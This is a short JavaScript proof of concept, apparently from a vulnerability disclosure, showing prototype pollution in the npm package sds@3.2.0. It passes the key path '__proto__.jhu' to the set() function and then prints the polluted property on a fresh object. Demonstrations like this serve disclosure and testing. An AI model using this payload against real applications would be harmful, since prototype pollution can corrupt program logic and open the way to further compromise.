/**
 * sds@3.2.0 is vulnerable to prototype pollution.
 * the pollution point is located in function set(object, keypath, value)
 * in "js/set.js".
 */


var root = require("sds");
var payload = "__proto__.jhu";
root.set({},payload,true);
console.log({}.jhu);
